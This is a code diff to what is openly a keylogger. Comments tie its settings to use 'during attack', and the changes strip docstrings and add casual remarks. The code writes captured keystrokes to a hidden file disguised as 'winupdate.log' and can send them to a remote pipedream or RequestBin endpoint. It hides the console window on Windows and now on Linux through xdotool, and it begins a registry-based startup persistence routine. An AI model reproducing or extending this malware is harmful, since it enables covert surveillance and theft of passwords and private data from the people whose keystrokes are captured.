@@ -10,15 +10,14 @@ import json
 
 
 STEALTH_MODE = True      # on during attack
-PERSISTENCE = False      # dont forget to on ts
+PERSISTENCE = False      #dont forget to on ts!!
 LOCAL_LOGGING = True     
-REMOTE_LOGGING = False   # RequestBin
+REMOTE_LOGGING = False   # RequestBin || true for attack 
 ENCRYPT_LOGS = True      
 
-# For REMOTE_LOGGING (Demo: Use https://pipedream.com to create a free endpoint)
-REMOTE_SERVER = "https://your-endpoint.m.pipedream.net"  #pipedream
+# For REMOTE_LOGGING (Demo: Use https://pipedream.com to create a free endpoint || requestbin) 
+REMOTE_SERVER = "https://your-endpoint.m.pipedream.net"  #pipedream(demo only not working for now, will fix soon ig?)
 
-# === SETUP ===
 LOG_FILE = os.path.join(tempfile.gettempdir(), "winupdate.log")  # Hidden log file
 if ENCRYPT_LOGS:
     ENCRYPTION_KEY = Fernet.generate_key()
@@ -64,7 +63,6 @@ def log_keystroke(key_data: str):
             logging.error(f"Remote logging failed: {e}")
 
 def on_press(key):
-    """Handle key presses and special keys."""
     try:
         # Special keys 
         special_keys = {
@@ -86,17 +84,24 @@ def on_press(key):
         logging.error(f"Key processing error: {e}")
 
 
-def hide_console():
-    """Hide console window in stealth mode."""
-    if STEALTH_MODE and os.name == "nt":
-        try:
-            import win32gui, win32con
-            win32gui.ShowWindow(win32gui.GetForegroundWindow(), win32con.SW_HIDE)
-        except ImportError:
-            logging.warning("pywin32 not installed. Stealth mode disabled.")
+#hides the fucking popup in windows and linux, "xdotool" would be better if possible 
+def hide_console(): 
+    if STEALTH_MODE:
+        if os.name == "nt":
+            try:
+                import win32gui, win32con
+                win32gui.ShowWindow(win32gui.GetForegroundWindow(), win32con.SW_HIDE)
+            except ImportError:
+                logging.warning("pywin32 not installed. Stealth mode disabled.")
+        elif os.name == "posix":
+            
+            try:
+                os.system("xdotool getactivewindow windowminimize")
+            except Exception:
+                logging.warning("xdotool not available. Stealth mode limited on Linux.")
 
 def add_persistence():
-    """Add to startup (recommended)."""
+    #persistence(add to startup) 
     if PERSISTENCE and os.name == "nt":
         try:
             import winreg
